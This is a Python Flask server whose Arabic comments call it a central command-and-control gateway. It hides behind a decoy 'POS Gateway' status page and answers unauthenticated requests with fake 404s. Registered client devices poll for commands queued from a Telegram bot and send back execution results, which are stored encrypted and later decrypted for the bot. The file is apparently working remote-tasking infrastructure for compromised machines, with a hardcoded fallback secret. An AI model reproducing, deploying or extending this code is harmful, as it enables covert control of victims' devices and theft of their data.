#!/usr/bin/env python3
# core_service_monitor.py - بوابة التحكم والقيادة المركزية
# هذا الملف هو الخادم الرئيسي الذي يدير قاعدة البيانات ويتواصل مع البوت والأجهزة.

import os
import hmac
import hashlib
import logging
from flask import Flask, jsonify, request
from supabase import create_client
from security_shield import SecurityShield

# -------------------- الإعدادات الأساسية --------------------
app = Flask(__name__)
app.static_folder = 'static'  # لخدمة صفحة التمويه (index.html)

# قراءة المتغيرات من البيئة (يجب ضبطها في Render)
SUPABASE_URL = os.environ.get('SUPABASE_URL')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
ACCESS_KEY = os.environ.get('ACCESS_KEY')
MASTER_SECRET = os.environ.get('MASTER_SECRET', 'default-nuclear-key').encode()

if not SUPABASE_URL or not SUPABASE_KEY or not ACCESS_KEY:
    raise ValueError("❌ Missing critical environment variables (SUPABASE_URL, SUPABASE_KEY, ACCESS_KEY)")

# الاتصال بقاعدة البيانات وتهيئة التشفير
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
shield = SecurityShield(MASTER_SECRET)

# إعداد تسجيل الأخطاء
logging.basicConfig(level=logging.INFO)

# -------------------- المصادقة (Gatekeeper) --------------------
def authenticate_request():
    auth = request.headers.get('X-Service-Auth')
    return auth and hmac.compare_digest(auth, ACCESS_KEY)

@app.before_request
def gatekeeper():
    # الصفحة الرئيسية مفتوحة (للتمويه)، باقي النقاط تتطلب المصادقة
    if request.path != '/' and not authenticate_request():
        return jsonify({"error": "Not Found"}), 404

# -------------------- نقاط النهاية العامة --------------------
@app.route('/')
def home():
    return jsonify({
        "service": "POS Gateway v2.3.1",
        "status": "operational",
        "timestamp": "secure"
    })

# -------------------- نقاط النهاية للأجهزة (clients) --------------------
@app.route('/api/register-client', methods=['POST'])
def register_client():
    """تسجيل جهاز جديد (أو تحديث آخر ظهور)"""
    data = request.json
    client_serial = data.get('client_serial')
    if not client_serial:
        return jsonify({"error": "missing client_serial"}), 400

    # إدراج أو تحديث (upsert)
    supabase.table('pos_clients').upsert({
        'client_serial': client_serial,
        'last_ping': 'now()',
        'operational_status': 'online'
    }).execute()
    return jsonify({"status": "registered"})

@app.route('/api/poll/<client_serial>', methods=['GET'])
def poll_requests(client_serial):
    """جلب المهام المعلقة لجهاز معين"""
    tasks = supabase.table('service_requests') \
        .select('*') \
        .eq('target_client', client_serial) \
        .eq('ticket_status', 'open') \
        .order('opened_at') \
        .execute()

    # تحديث حالة المهام إلى 'in_progress' عند قراءتها
    for task in tasks.data:
        supabase.table('service_requests') \
            .update({'ticket_status': 'in_progress'}) \
            .eq('ticket_id', task['ticket_id']) \
            .execute()
    return jsonify(tasks.data)

@app.route('/api/result', methods=['POST'])
def submit_result():
    """استقبال نتيجة تنفيذ مهمة من الجهاز"""
    data = request.json
    ticket_id = data.get('ticket_id')
    resolution = data.get('resolution_log')
    if not ticket_id or not resolution:
        return jsonify({"error": "missing data"}), 400

    # تشفير النتيجة قبل التخزين
    encrypted = shield.encrypt(resolution)
    supabase.table('service_requests') \
        .update({
            'resolution_log': encrypted,
            'ticket_status': 'closed',
            'last_updated': 'now()'
        }) \
        .eq('ticket_id', ticket_id) \
        .execute()
    return jsonify({"status": "received"})

@app.route('/api/log-error', methods=['POST'])
def log_error():
    """تسجيل خطأ (لأغراض الدعم الفني)"""
    data = request.json
    payload = data.get('error_payload')
    if payload:
        encrypted = shield.encrypt(payload)
        supabase.table('error_logs').insert({'error_payload': encrypted}).execute()
    return jsonify({"status": "logged"})

# -------------------- نقاط النهاية للبوت (telegram) --------------------
@app.route('/api/clients', methods=['GET'])
def list_clients():
    """جلب قائمة بجميع الأجهزة (للبوت)"""
    result = supabase.table('pos_clients') \
        .select('client_serial, operational_status, last_ping') \
        .execute()
    return jsonify(result.data)

@app.route('/api/command', methods=['POST'])
def post_command():
    """إدراج أمر جديد من البوت (مهمة للجهاز)"""
    data = request.json
    if not data or 'target_client' not in data or 'request_type' not in data:
        return jsonify({"error": "missing fields"}), 400

    # يمكن تشفير request_data هنا إذا أردت
    req_data = data.get('request_data', '')

    supabase.table('service_requests').insert({
        'target_client': data['target_client'],
        'request_type': data['request_type'],
        'request_data': req_data,
        'ticket_status': 'open'
    }).execute()
    return jsonify({"status": "created", "ticket_id": "TKT-" + str(int(os.times()[4]))})

@app.route('/api/results', methods=['GET'])
def get_results():
    """جلب آخر النتائج من المهام المنجزة (للبوت)"""
    result = supabase.table('service_requests') \
        .select('target_client, resolution_log, updated_at') \
        .neq('resolution_log', None) \
        .order('updated_at', desc=True) \
        .limit(10) \
        .execute()
    # فك تشفير النتائج قبل الإرسال للبوت (اختياري)
    for item in result.data:
        if item['resolution_log']:
            try:
                item['resolution_log'] = shield.decrypt(item['resolution_log'])
            except:
                item['resolution_log'] = "[encrypted]"
    return jsonify(result.data)

# -------------------- تشغيل الخادم --------------------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
